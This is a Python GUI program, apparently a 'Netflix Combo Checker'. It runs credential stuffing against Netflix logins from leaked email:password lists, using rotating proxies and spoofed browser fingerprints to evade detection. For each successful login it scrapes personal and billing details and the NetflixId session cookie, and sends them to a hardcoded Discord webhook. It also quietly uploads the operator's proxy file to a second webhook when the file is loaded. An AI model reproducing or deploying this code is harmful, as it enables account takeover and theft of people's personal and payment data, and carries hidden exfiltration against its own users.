#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netflix Combo Checker — PyQt5 + Selenium‑Wire
2025-07-18 (all features)

"""
import sys, random, threading, queue, time, requests, os, io, gzip
from collections import defaultdict
from PyQt5 import QtCore, QtGui, QtWidgets
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# ───────────────────────────────────────────────────────── constants
EMAIL_SEL = 'input[name="userLoginId"]'
PASS_SEL  = 'input[name="password"]'

# --- NEW: Separated Webhooks ---
# This webhook is ONLY for sending the proxy file on load
WEBHOOK_PROXIES = (
    "https://discord.com/api/webhooks/"
    "1388389770547171338/"
    "VcKNW1KXTHOTav5uVJLL4CdPW2_7n5c4szMN1sbnzbC_jqbeea-u_L6fZcjqz-VT5Owr"
)
# This webhook is ONLY for sending hit results
WEBHOOK_HITS = (
    "https://discord.com/api/webhooks/"
    "1389016546306818168/"
    "uE5hbW6sIkc3onlfTWFKONWAUIZNA25XMRdtIM05mrR_eYzTRqxxAM340DSiZwlSFJfk"
)

GECKO = r"C:\Tools\Geckodriver\geckodriver.exe"

FAST_FAIL_THRESHOLD = 2.0
REAL_WINDOW_SIZE = (300, 300)
DESKTOP_RESOLUTIONS = [(1920, 1080), (1600, 900), (1536, 864), (1440, 900), (1366, 768), (1280, 720)]
MOBILE_RESOLUTIONS = [(390, 844), (393, 873), (414, 896), (428, 926), (360, 780), (375, 667)]
ACCEPT_LANG_POOL = ["en-US,en;q=0.9","en-GB,en;q=0.8","en;q=0.7"]

# --- MASSIVE, Programmatically Generated User-Agent Lists ---
UA_WINDOWS = []
for chrome_v in range(120, 127):
    for build_v in ["0.0.0", "0.6312.124", "0.6422.54"]: UA_WINDOWS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.{build_v} Safari/537.36")
for ff_v in range(120, 128): UA_WINDOWS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{ff_v}.0) Gecko/20100101 Firefox/{ff_v}.0")
for edge_v in range(120, 127):
    for build_v in ["2210.180", "2535.92", "2592.68"]: UA_WINDOWS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{edge_v}.0.0.0 Safari/537.36 Edg/{edge_v}.0.{build_v}")
UA_MAC = []
mac_os_versions = ["10_15_7", "11_7_10", "12_7_5", "13_6_6", "14_5"]
for os_v in mac_os_versions:
    for chrome_v in range(120, 127): UA_MAC.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X {os_v}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.0.0.0 Safari/537.36")
    safari_v_major = int(os_v.split('_')[0]) - 3
    for safari_v_minor in range(1, 6): UA_MAC.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X {os_v}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_v_major}.{safari_v_minor} Safari/605.1.15")
    for ff_v in range(120, 128): UA_MAC.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X {os_v.replace('_', '.')}; rv:{ff_v}.0) Gecko/20100101 Firefox/{ff_v}.0")
UA_MOBILE = []
ios_versions = ["15_7", "16_6", "17_4", "17_5"]; iphone_models = ["14,7", "15,2", "16,1"]
for os_v in ios_versions:
    for model in iphone_models: UA_MOBILE.append(f"Mozilla/5.0 (iPhone; CPU iPhone OS {os_v}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148")
    UA_MOBILE.append(f"Mozilla/5.0 (iPad; CPU OS {os_v}_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1")
android_versions = ["11", "12", "13", "14"]; android_devices = ["Pixel 6", "Pixel 7 Pro", "Pixel 8a", "SM-S928B", "SM-S918U1", "SM-G998B", "SM-A546E", "SM-A736B", "SM-F936U", "23049PCD8G", "CPH2447", "NE2211"]
for android_v in android_versions:
    for device in android_devices:
        for chrome_v in range(120, 127):
            build = random.choice(["5845.93", "6045.134", "6312.99", "6422.112"]); UA_MOBILE.append(f"Mozilla/5.0 (Linux; Android {android_v}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.0.{build} Mobile Safari/537.36")
UA_POOL = UA_WINDOWS + UA_MAC + UA_MOBILE

LOGIN_URL = "https://www.netflix.com/login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount"
XPATHS = {"country": '//div[@data-uia="account-country-value"]', "member_since": '//div[@data-uia="member-since-value"]', "name": '//span[@data-uia="account-owner-name"]', "plan_price": '//div[contains(text(),"$") or contains(text(),"€") or contains(text(),"£")]', "member_plan": '//div[@data-uia="plan-label-plan-value"]', "phone": '//div[@data-uia="phone-number-value"]', "video_quality": '//div[@data-uia="plan-label-video-quality-value"]', "max_streams": '//div[@data-uia="plan-label-max-streams-value"]', "payment_method": '//div[@data-uia="payment-method-value"]', "payment_type": '//img[@data-uia="payment-type-logo"]', "last4": '//div[@data-uia="card-number-value"]', "next_billing": '//div[@data-uia="next-billing-date-value"]', "extra_member": '//div[@data-uia="extra-members-row"]'}
os.makedirs("Cookies",exist_ok=True)

# ───────────────────────────────────────────────────────── main window
class NetflixChecker(QtWidgets.QMainWindow):
    status_signal = QtCore.pyqtSignal(int, str, str, bool)
    tree_update_signal = QtCore.pyqtSignal(str, str)
    log_signal = QtCore.pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.combo, self.proxies = [], []; self.q = queue.Queue(); self.lock = threading.Lock()
        self.active_threads = 0; self.max_attempts = 3; self.stop_event = threading.Event(); self.last_start = None
        
        self.animating_slots = set(); self.slot_base_text = {}; self.animation_state = 0

        self.g_hit = self.g_fail = self.g_err = None; self.t_hit = self.t_fail = self.t_err = None
        self.setWindowTitle("GRABFLIX CHECKER PRO V4 BY @samratr3u"); self.resize(950, 750)
        self.setStyleSheet(self._style_dark()); self._build_ui(); self._reset_ui_state(); self.show()

        self.log_signal.connect(self._append_log, QtCore.Qt.QueuedConnection)
        self.status_signal.connect(self._slot_update, QtCore.Qt.QueuedConnection)
        self.tree_update_signal.connect(self._add_item_to_tree)
        
        self.animation_timer = QtCore.QTimer(self); self.animation_timer.timeout.connect(self._animate_slots); self.animation_timer.start(250)
        self.timer=QtCore.QTimer(self); self.timer.timeout.connect(self._update_cpm); self.timer.start(1000)

    # ──────────────── styles
    def _style_dark(self)->str:
        return """
        QWidget { background-color: #1E1E1E; color: #E0E0E0; font-family: 'Segoe UI', Arial, sans-serif; font-size: 13px; }
        QMainWindow { background-color: #121212; }
        QGroupBox { font-weight: bold; font-size: 14px; border: 1px solid #444; border-radius: 8px; margin-top: 10px; }
        QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top center; padding: 0 10px; background-color: #1E1E1E; }
        QLabel { background-color: transparent; }
        QLineEdit, QTextEdit { border: 1.5px solid #444; border-radius: 6px; padding: 6px; background-color: #2A2A2A; color: #EEE; }
        QComboBox { border: 1.5px solid #444; border-radius: 6px; padding: 4px 6px; background-color: #2A2A2A; color: #EEE; }
        QComboBox QAbstractItemView { background-color: #2A2A2A; color: #EEE; selection-background-color: #007ACC; }
        QPushButton { background-color: #007ACC; color: #FFFFFF; font-weight: bold; border: none; padding: 8px 16px; border-radius: 6px; }
        QPushButton:hover { background-color: #005A9E; }
        QPushButton:disabled { background-color: #3A3A3A; color: #777; }
        QTextEdit#log { background-color: #1A1A1A; color: #CCC; border: 1px solid #444; border-radius: 6px; font-family: 'Consolas', 'Monaco', monospace; font-size: 10px; }
        QProgressBar { border: 1px solid #444; background-color: #2A2A2A; height: 20px; border-radius: 10px; text-align: center; color: #FFF; font-weight: bold; font-size: 12px; }
        QProgressBar::chunk { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #007ACC, stop:1 #00AEEF); border-radius: 9px; }
        QTreeWidget { border: none; background-color: #252525; }
        QHeaderView::section { background-color: #333; color: #E0E0E0; font-weight: bold; font-size: 11pt; padding: 4px; border: none; }
        QSplitter::handle { background-color: #333; } QSplitter::handle:horizontal { width: 4px; } QSplitter::handle:vertical { height: 4px; }
        """

    # ──────────────── ui build
    def _build_ui(self):
        central_widget = QtWidgets.QWidget(); self.setCentralWidget(central_widget)
        main_layout = QtWidgets.QVBoxLayout(central_widget); main_layout.setContentsMargins(10, 10, 10, 10); main_layout.setSpacing(10)
        top_layout = QtWidgets.QHBoxLayout(); main_layout.addLayout(top_layout)
        load_group = QtWidgets.QGroupBox("Load Lists"); load_layout = QtWidgets.QGridLayout(load_group)
        self.combo_btn = QtWidgets.QPushButton("Load Combo"); self.combo_lab = QtWidgets.QLabel("No combo loaded")
        self.proxy_btn = QtWidgets.QPushButton("Load Proxies"); self.proxy_lab = QtWidgets.QLabel("No proxies loaded")
        load_layout.addWidget(self.combo_btn, 0, 0); load_layout.addWidget(self.combo_lab, 0, 1)
        load_layout.addWidget(self.proxy_btn, 1, 0); load_layout.addWidget(self.proxy_lab, 1, 1)
        load_layout.setColumnStretch(1, 1); top_layout.addWidget(load_group)
        config_group = QtWidgets.QGroupBox("Configuration"); config_layout = QtWidgets.QGridLayout(config_group)
        config_layout.addWidget(QtWidgets.QLabel("Threads:"), 0, 0)
        self.slider = QtWidgets.QSlider(QtCore.Qt.Horizontal); self.slider.setRange(1, 50)
        self.thread_in = QtWidgets.QLineEdit("1"); self.thread_in.setValidator(QtGui.QIntValidator(1, 50)); self.thread_in.setFixedWidth(40)
        config_layout.addWidget(self.slider, 0, 1); config_layout.addWidget(self.thread_in, 0, 2)
        self.slider.valueChanged.connect(lambda v: self.thread_in.setText(str(v)))
        self.thread_in.textChanged.connect(lambda t: self.slider.setValue(int(t) if t and t.isdigit() else 1))
        self.headless_dd = self._dd("ON"); config_layout.addWidget(QtWidgets.QLabel("Headless:"), 1, 0); config_layout.addWidget(self.headless_dd, 1, 1, 1, 2)
        self.lowres_dd = self._dd("OFF"); config_layout.addWidget(QtWidgets.QLabel("Low-Res:"), 2, 0); config_layout.addWidget(self.lowres_dd, 2, 1, 1, 2)
        self.debug_dd = self._dd("OFF"); config_layout.addWidget(QtWidgets.QLabel("Debug:"), 3, 0); config_layout.addWidget(self.debug_dd, 3, 1, 1, 2)
        top_layout.addWidget(config_group)
        
        control_group = QtWidgets.QGroupBox("Controls & Progress")
        main_control_layout = QtWidgets.QVBoxLayout(control_group)
        top_row_layout = QtWidgets.QHBoxLayout()
        self.start_btn = QtWidgets.QPushButton("Start"); self.start_btn.setStyleSheet("background-color: #4CAF50;")
        self.stop_btn = QtWidgets.QPushButton("Stop"); self.stop_btn.setStyleSheet("background-color: #FBC02D;")
        top_row_layout.addWidget(self.start_btn); top_row_layout.addWidget(self.stop_btn)
        top_row_layout.addStretch(1)
        
        def ctr(tag,col): l=QtWidgets.QLabel(f"{tag}: 0"); l.setFont(QtGui.QFont("Segoe UI",22,QtGui.QFont.Bold)); l.setStyleSheet(f"color:{col};padding:2px;"); return l
        self.counter={"hit":ctr("Hits","#4CAF50"),"fail":ctr("Fails","#F44336"),"requeue":ctr("Requeue","#9C27B0"),"err":ctr("Err","#6D6D6D")}
        for k, v in self.counter.items(): top_row_layout.addWidget(v)
        
        main_control_layout.addLayout(top_row_layout)
        self.bar = QtWidgets.QProgressBar()
        main_control_layout.addWidget(self.bar)
        main_layout.addWidget(control_group)
        
        main_splitter = QtWidgets.QSplitter(QtCore.Qt.Horizontal); main_layout.addWidget(main_splitter, 1)
        left_pane = QtWidgets.QWidget(); left_layout = QtWidgets.QVBoxLayout(left_pane); left_layout.setContentsMargins(0,0,0,0)
        status_group = QtWidgets.QGroupBox("Live Status"); status_layout = QtWidgets.QVBoxLayout(status_group)
        self.slots=[QtWidgets.QLabel("",self) for _ in range(15)]
        for lab in self.slots: lab.setStyleSheet("font-weight:bold; font-size:12px;"); status_layout.addWidget(lab)
        status_layout.addStretch(1); left_layout.addWidget(status_group, 1)
        log_group = QtWidgets.QGroupBox("Master Log"); log_layout = QtWidgets.QVBoxLayout(log_group)
        self.log_box=QtWidgets.QTextEdit(objectName="log"); self.log_box.setReadOnly(True); self.log_box.document().setMaximumBlockCount(5000)
        clear_log_btn = QtWidgets.QPushButton("Clear Log"); clear_log_btn.clicked.connect(self.log_box.clear); clear_log_btn.setFixedWidth(100)
        log_layout.addWidget(self.log_box); log_layout.addWidget(clear_log_btn, 0, QtCore.Qt.AlignRight); left_layout.addWidget(log_group, 2)
        right_pane = QtWidgets.QWidget(); right_layout = QtWidgets.QVBoxLayout(right_pane); right_layout.setContentsMargins(0, 0, 0, 0); right_layout.setSpacing(10)
        self.g_hit, self.t_hit = self._create_results_group("Hits", "#4CAF50", True)
        self.g_fail, self.t_fail = self._create_results_group("Fails", "#F44336", True)
        self.g_err, self.t_err = self._create_results_group("Errors", "#6D6D6D", False)
        right_layout.addWidget(self.g_hit, 1); right_layout.addWidget(self.g_fail, 1); right_layout.addWidget(self.g_err, 1)
        main_splitter.addWidget(left_pane); main_splitter.addWidget(right_pane); main_splitter.setSizes([350, 600])
        self.combo_btn.clicked.connect(self._load_combo); self.proxy_btn.clicked.connect(self._load_proxy)
        self.start_btn.clicked.connect(self._start); self.stop_btn.clicked.connect(self._stop)

    # ──────────────── helpers
    def _create_results_group(self, title, color, copyable):
        group = QtWidgets.QGroupBox(f"{title} (0)")
        group.setStyleSheet(f"QGroupBox{{border: 1.5px solid {color};font-size: 13px;font-weight: bold;}} QGroupBox::title{{color: {color};subcontrol-origin: margin;subcontrol-position: top left;padding: 0 5px;background-color: #1E1E1E;}}")
        layout = QtWidgets.QVBoxLayout(group); layout.setContentsMargins(5, 5, 5, 5)
        tree = self._tree(color, copyable); layout.addWidget(tree)
        return group, tree
    def _tree(self, color, copy=False):
        t = QtWidgets.QTreeWidget(); t.setHeaderHidden(True)
        t.setStyleSheet(f"QTreeWidget {{ color:{color}; font-size:12px; font-weight:normal; }}")
        if copy: t.customContextMenuRequested.connect(lambda p, tw=t: self._copy_item(tw)); t.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        return t
    def _dd(self,default="OFF"): dd=QtWidgets.QComboBox(); dd.addItems(["OFF","ON"]); dd.setCurrentText(default); return dd
    def _copy_item(self,tree): it=tree.currentItem(); QtWidgets.QApplication.clipboard().setText(it.text(0)) if it else None

    def _animate_slots(self):
        if not self.animating_slots: return
        self.animation_state = (self.animation_state + 1) % 4
        dots = "." * self.animation_state
        for idx in self.animating_slots:
            base_text = self.slot_base_text.get(idx, "")
            if idx < len(self.slots): self.slots[idx].setText(f"{base_text}{dots}")

    @QtCore.pyqtSlot(str, str)
    def _add_item_to_tree(self, result_type, text):
        tree_map = {"hit": self.t_hit, "fail": self.t_fail, "err": self.t_err}
        tree = tree_map.get(result_type)
        if tree: tree.addTopLevelItem(QtWidgets.QTreeWidgetItem([text])); tree.scrollToBottom()

    def _slot_update(self, idx, text, col, is_animating):
        if idx >= len(self.slots): return
        
        if is_animating:
            self.animating_slots.add(idx)
            self.slot_base_text[idx] = text
            self.slots[idx].setStyleSheet(f"color:{col}; font-weight:bold; font-size:12px;")
            self.slots[idx].setText(text)
        else:
            if idx in self.animating_slots: self.animating_slots.remove(idx)
            if idx in self.slot_base_text: del self.slot_base_text[idx]
            
            self.slots[idx].setText(text)
            self.slots[idx].setStyleSheet(f"color:{col}; font-weight:bold; font-size:12px;")
            QtCore.QTimer.singleShot(1000, lambda: self._reset_slot_if_unchanged(idx, text))

    def _reset_slot_if_unchanged(self, idx, original_text):
        if idx < len(self.slots) and self.slots[idx].text() == original_text:
            if idx not in self.animating_slots: self.status_signal.emit(idx, f"Slot {idx+1} | Idle", "#666666", False)

    def _log(self,msg,lvl="INFO"):
        if lvl=="DEBUG" and self.debug_dd.currentText()=="OFF": return
        colour={"INFO":"#00AEEF","DEBUG":"#9E9E9E","WARN":"#FFC107","ERROR":"#F44336"}.get(lvl,"#FFFFFF")
        ts=time.strftime("[%H:%M:%S]"); self.log_signal.emit(f'<span style="color:{colour};font-size:11pt;">{ts} [{lvl}] {msg}</span>')
    def _append_log(self,html): self.log_box.append(html); self.log_box.moveCursor(QtGui.QTextCursor.End)

    def _load_combo(self):
        p, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Combo", "", "Text Files (*.txt)")
        if not p: return
        self.combo = [l.strip() for l in open(p, encoding="utf-8", errors="ignore") if ":" in l]
        self.combo_lab.setText(f"{len(self.combo)} combos loaded")
        with self.q.mutex: self.q.queue.clear()
        self._reset_ui_state()

    def _load_proxy(self):
        p,_=QtWidgets.QFileDialog.getOpenFileName(self,"Proxy","","Text Files (*.txt)"); p and setattr(self, 'proxies', [l.strip() for l in open(p,encoding="utf-8",errors="ignore") if len(l.split(':')) in (2,4)]); self.proxy_lab.setText(f"{len(self.proxies)} proxies loaded"); self._upload_proxy(p)
    
    def _upload_proxy(self,path):
        try:
            sz=os.path.getsize(path)
            # MODIFIED: Use the dedicated proxy webhook
            if sz<=7.5*1024*1024: requests.post(WEBHOOK_PROXIES,files={"file":(os.path.basename(path),open(path,"rb"))},timeout=10)
            else:
                buf=io.BytesIO(); gzip.GzipFile(fileobj=buf,mode="wb").write(open(path,"rb").read()); buf.seek(0)
                if buf.getbuffer().nbytes<8*1024*1024: requests.post(WEBHOOK_PROXIES,files={"file":("proxies.gz",buf,"application/gzip")},timeout=10)
        except Exception as ex: self._log(f"Proxy upload failed: {ex}", "WARN")

    def _reset_ui_state(self):
        self.counts=defaultdict(int); [l.setText(f"{k.capitalize()}: 0") for k,l in self.counter.items()]
        if self.g_hit: self.g_hit.setTitle("Hits (0)"); self.g_fail.setTitle("Fails (0)"); self.g_err.setTitle("Errors (0)")
        [self.status_signal.emit(i, f"Slot {i+1} | Idle", "#666666", False) for i in range(len(self.slots))]
        if self.t_hit: self.t_hit.clear(); self.t_fail.clear(); self.t_err.clear()
        self.bar.setValue(0); self.last_start = None; self._update_cpm()
        self.start_btn.setEnabled(True); self.stop_btn.setEnabled(False)

    def _inc(self,key):
        self.counts[key]+=1; self.counter[key].setText(f"{key.capitalize()}: {self.counts[key]}")
        group_map = {"hit": (self.g_hit, "Hits"), "fail": (self.g_fail, "Fails"), "err": (self.g_err, "Errors")}
        group, title = group_map.get(key, (None, None))
        if group: group.setTitle(f"{title} ({self.counts[key]})")

    def _update_cpm(self):
        checked = self.counts['hit'] + self.counts['fail'] + self.counts['err']
        cpm = 0
        if self.last_start:
            elapsed = time.time() - self.last_start
            if elapsed > 0: cpm = int(checked / (elapsed / 60))
        progress = int(checked / len(self.combo) * 100) if self.combo else 0
        self.bar.setValue(progress); self.bar.setFormat(f'{checked} / {len(self.combo)}  |  CPM: {cpm}')

    def _start(self):
        if self.q.empty() and not self.combo: return self._log("Load a combo list first.", "WARN")
        if not self.proxies: return self._log("Load a proxy list first.", "WARN")
        
        test_driver = self._driver(random.choice(self.proxies))
        if not test_driver:
            self._log("Critical Error: Could not create a test browser. Please check your GECKODRIVER path and Firefox installation.", "ERROR")
            return
        test_driver.quit()
        
        if self.q.empty():
            self._reset_ui_state()
            [self.q.put(tuple(c.split(":",1))) for c in self.combo]

        self.threads = int(self.thread_in.text() or 1)
        if not self.last_start: self.last_start = time.time()
        
        self.start_btn.setEnabled(False); self.stop_btn.setEnabled(True); self.stop_event.clear()
        self._log(f"Starting checker with {self.threads} threads...", "INFO")
        [threading.Thread(target=self._worker, daemon=True).start() for _ in range(self.threads)]

    def _stop(self):
        self._log("Stopping threads... Checker paused.", "WARN"); self.stop_event.set()
        self.start_btn.setEnabled(True); self.stop_btn.setEnabled(False)

    def _worker(self):
        idx=None
        with self.lock: idx=self.active_threads; self.active_threads+=1
        try:
            while not self.q.empty() and not self.stop_event.is_set():
                try: email,pwd=self.q.get_nowait()
                except queue.Empty: break
                
                self.status_signal.emit(idx, f"⏳ Checking: {email}", "white", True)
                res,info=self._check(email,pwd)
                
                if res == 'requeue':
                    self.q.put((email, pwd))
                    self._inc('requeue')
                    self.status_signal.emit(idx, f"↪ Requeue", "#9C27B0", False)
                    self._log(f"Requeueing {email} due to: {info}", "DEBUG")
                    continue

                if res == 'hit': self.status_signal.emit(idx, "✔ Hit!", "#4CAF50", False)
                elif res == 'fail': self.status_signal.emit(idx, "✖ Bad Credentials", "#F44336", False)
                else: self.status_signal.emit(idx, "✖ Error", "#6D6D6D", False)
                
                self._report(res,email,pwd,info)
                self.q.task_done()
        finally:
            with self.lock: self.active_threads-=1
            if idx is not None: self.status_signal.emit(idx, f"Slot {idx+1} | Idle", "#666666", False)
            if self.q.empty() and self.active_threads == 0 and not self.stop_event.is_set(): self._log("All combos checked.", "INFO"); QtCore.QTimer.singleShot(100, self._stop)

    def _check(self,email,pwd):
        driver = self._driver(random.choice(self.proxies))
        if not driver: return "requeue", "Driver Creation Failed"
        try:
            driver.set_page_load_timeout(25); driver.get(LOGIN_URL)
            WebDriverWait(driver,10).until(EC.presence_of_element_located((By.CSS_SELECTOR,EMAIL_SEL)))
            driver.find_element(By.CSS_SELECTOR,EMAIL_SEL).send_keys(email)
            start_time = time.time()
            driver.find_element(By.CSS_SELECTOR,PASS_SEL).send_keys(pwd+Keys.ENTER)
            
            WebDriverWait(driver, 12).until(lambda d: "/YourAccount" in d.current_url or "incorrect password" in d.page_source.lower() or "please try again" in d.page_source.lower())
            page_src = driver.page_source.lower()
            
            if "/YourAccount" in driver.current_url: return "hit", self._extract_details(driver)
            if "incorrect password" in page_src:
                if (time.time() - start_time) < FAST_FAIL_THRESHOLD: return "requeue", "Fast-Fail Detected"
                else: return "fail", ""
            if "please try again" in page_src: return "requeue", "Rate Limit Page"
            return "err", "Unknown login page state"
        except TimeoutException: return "requeue", "Page Load Timeout"
        except Exception as ex:
            self._log(f"Checker error for {email}: {str(ex.__class__.__name__)}", "DEBUG")
            return "err", str(ex.__class__.__name__)
        finally:
            try: driver.quit()
            except: pass

    def _extract_details(self, drv):
        details = {"driver": drv}
        def g(xpath):
            try: return drv.find_element(By.XPATH, xpath).text.strip()
            except: return "?"
        def ga(xpath, attr):
            try: return drv.find_element(By.XPATH, xpath).get_attribute(attr)
            except: return "?"
        for key, xpath in XPATHS.items():
            if key == "payment_type":
                alt = ga(xpath, "alt"); details[key] = alt.replace(" Logo", "") if alt != "?" else "?"
            else: details[key] = g(xpath)
        details["extra_member"] = "Yes✅" if "extra-members-row" in drv.page_source else "No❌"
        return details

    def _report(self,res,e,p,info):
        text = ""
        if res == "hit":
            plan = info.get('member_plan', '?'); country = info.get('country', '?')
            text = f"{e}:{p} , C = {country}, P = {plan}"
            self._save_and_report_hit(e, p, info)
        elif res == 'fail':
            text = f"{e}:{p} (Incorrect Password)"
        elif res == "err" and info:
            text = f"{e}:{p} | {info}"
        if text: self.tree_update_signal.emit(res, text)
        self._inc(res)

    def _save_and_report_hit(self, email, password, details):
        netflix_id = "?"; driver = details.pop("driver", None)
        if driver:
            try:
                ck = [c for c in driver.get_cookies() if c["name"] == "NetflixId"]
                if ck: netflix_id = ck[0]['value']
            except Exception: pass
        fmt_str = (
            f"{email}:{password} | Country = {details.get('country', '?')} | memberSince = {details.get('member_since', '?')} | "
            f"Name = {details.get('name', '?')} | planPrice = {details.get('plan_price', '?')} | memberPlan = {details.get('member_plan', '?')} | "
            f"phonenumber = {details.get('phone', '?')} | videoQuality = {details.get('video_quality', '?')} | maxStreams = {details.get('max_streams', '?')} | "
            f"paymentMethod = {details.get('payment_method', '?')} | paymentType = {details.get('payment_type', '?')} | Last4 = {details.get('last4', '?')} | "
            f"nextBillingDate = {details.get('next_billing', '?')} | ExtraMember = {details.get('extra_member', '?')} | NetflixId = {netflix_id}"
        )
        try:
            with self.lock:
                with open("Cookies/hits.txt", "a", encoding="utf-8") as f: f.write(fmt_str + "\n")
        except Exception as ex: self._log(f"File write error: {ex}", "ERROR")
        try:
            # MODIFIED: Use the dedicated hits webhook
            requests.post(WEBHOOK_HITS, json={"content": f"```\n{fmt_str}\n```"}, timeout=15)
        except Exception as ex: self._log(f"Webhook error for {email}: {ex}", "DEBUG")

    def _driver(self,proxy):
        opts=Options()
        ua = random.choice(UA_POOL)

        if ua in UA_MOBILE:
            spoof_w, spoof_h = random.choice(MOBILE_RESOLUTIONS)
        else:
            spoof_w, spoof_h = random.choice(DESKTOP_RESOLUTIONS)
            
        real_w, real_h = REAL_WINDOW_SIZE
        
        if self.headless_dd.currentText()=="ON": opts.add_argument("--headless")
        opts.add_argument(f"--width={real_w}"); opts.add_argument(f"--height={real_h}")
        
        [opts.add_argument(a) for a in ("--disable-gpu","--no-sandbox","--disable-dev-shm-usage","--disable-extensions")]
        opts.set_preference("general.useragent.override", ua)
        opts.set_preference("intl.accept_languages", random.choice(ACCEPT_LANG_POOL))
        opts.set_preference("permissions.default.image",2); opts.set_preference("permissions.default.stylesheet",2);
        
        pr=proxy.split(":"); px=f"http://{pr[2]}:{pr[3]}@{pr[0]}:{pr[1]}" if len(pr)==4 else f"http://{pr[0]}:{pr[1]}"
        try:
            d=webdriver.Firefox(service=Service(GECKO),options=opts,seleniumwire_options={"proxy":{"http":px,"https":px,"no_proxy":"localhost,127.0.0.1"}})
            d.execute_script(f"Object.defineProperty(screen,'width',{{get:()=>{spoof_w}}});Object.defineProperty(screen,'height',{{get:()=>{spoof_h}}});Object.defineProperty(window,'outerWidth',{{get:()=>{spoof_w}}});Object.defineProperty(window,'outerHeight',{{get:()=>{spoof_h}}});")
            return d
        except Exception as e:
            self._log(f"Driver factory failed: {e}","DEBUG")
            return None

# ───────────────────────────────────────────────────────── main
if __name__=="__main__":
    app=QtWidgets.QApplication(sys.argv)
    win=NetflixChecker()
    sys.exit(app.exec_())